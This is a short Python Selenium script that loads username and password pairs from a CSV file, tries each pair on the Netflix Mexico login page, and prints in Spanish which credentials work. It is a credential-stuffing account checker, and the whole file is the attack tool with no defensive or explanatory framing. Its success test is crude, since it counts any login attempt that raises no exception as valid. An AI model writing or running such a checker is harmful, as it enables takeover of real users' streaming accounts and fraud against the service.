import os.path
import csv
import requests
from selenium import webdriver
import time
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException

with open('csv/data_netflix.csv', 'r') as csv_file:
    csv_reader = csv.reader(csv_file)

    for line in csv_reader:
        try:
            driver = webdriver.Chrome()
            driver.maximize_window()

            driver.get('https://www.netflix.com/mx/login')

            time.sleep(5)
            username_field = driver.find_element(By.NAME, 'userLoginId')
            username_field.send_keys(line[0])

            password_field = driver.find_element(By.NAME, 'password')
            password_field.send_keys(line[1])

            submit = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div[1]/form/button')
            submit.click()
            time.sleep(2)
            print(f"Las credenciales {line} , funcionan correctamente")
            
        except NoSuchElementException:
            print(f"Las credenciales {line} no funcionan... Intentando con el siguiente conjunto.")
        finally:
            # Cerrar el navegador en cualquier caso
            driver.quit()